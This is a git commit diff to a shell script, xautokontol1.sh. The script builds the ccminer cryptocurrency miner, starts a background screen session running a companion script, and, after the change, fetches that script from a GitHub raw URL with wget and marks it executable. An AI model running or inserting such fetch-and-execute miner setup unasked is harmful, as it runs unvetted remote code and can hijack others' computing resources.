4a12830170a713bcec4fcdde013daec4834db76b
renilo <88342640+renilo@users.noreply.github.com>
2021-10-10 00:58:54 +0700

    Update xautokontol1.sh

--- xautokontol1.sh
+++ xautokontol1.sh
@@ -6,8 +6,6 @@ sudo apt install screen -y
 
 screen -dmS xhajar1.sh ./xhajar1.sh 65 75
 
-wget https://raw.githubusercontent.com/renilo/hajar/main/xhajar1.sh
-
 sudo apt-get install libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev build-essential
 
 git clone --single-branch -b Verus2.2 https://github.com/monkins1010/ccminer.git
@@ -21,3 +19,7 @@ chmod +x configure.sh
 chmod +x autogen.sh
 
 ./build.sh
+
+wget https://raw.githubusercontent.com/renilo/hajar/main/xhajar1.sh
+
+chmod +x xhajar1.sh
